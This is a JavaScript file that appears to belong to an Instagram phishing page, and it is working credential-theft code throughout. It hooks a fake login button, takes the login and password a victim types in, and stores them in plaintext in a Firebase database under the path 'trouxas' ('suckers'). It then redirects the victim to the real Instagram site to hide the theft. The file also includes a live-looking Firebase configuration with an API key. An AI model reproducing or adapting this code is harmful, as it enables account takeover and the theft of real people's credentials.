import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.4/firebase-app.js"
import { getAnalytics } from "https://www.gstatic.com/firebasejs/10.12.4/firebase-analytics.js"
import { getDatabase, ref, set, get, child } from "https://www.gstatic.com/firebasejs/10.12.4/firebase-database.js"

const firebaseConfig = {
    apiKey: "AIzaSyBiW9VMzBA455a8sbpcjakHRMNOpPiBTMI",
    authDomain: "instasuay.firebaseapp.com",
    projectId: "instasuay",
    storageBucket: "instasuay.appspot.com",
    messagingSenderId: "735048252865",
    appId: "1:735048252865:web:0f9c0dd4a3cb1ee01cc340",
    measurementId: "G-7V7ZD0HPK4"
}

const app = initializeApp(firebaseConfig)
const analytics = getAnalytics(app)
const database = getDatabase(app)

document.getElementById('loginBtn').addEventListener('click', () => {
    const id = Date.now() 
    const login = document.getElementById('login').value
    const password = document.getElementById('password').value
    
    if (login && password) {
        set(ref(database, 'trouxas/' + id), {
            login: login,
            password: password
        }).then(() => {
            const dbRef = ref(getDatabase())
            return get(child(dbRef, `trouxas/${id}`))
        }).then((snapshot) => {
            if (snapshot.exists()) {
                console.log(snapshot.val())
                window.location.href = "https://www.instagram.com/"
            } else {
                console.log("No data available")
            }
        }).catch((error) => {
           console.error(error)
        })
    } else {
        console.log("Email or password is empty")
    }
})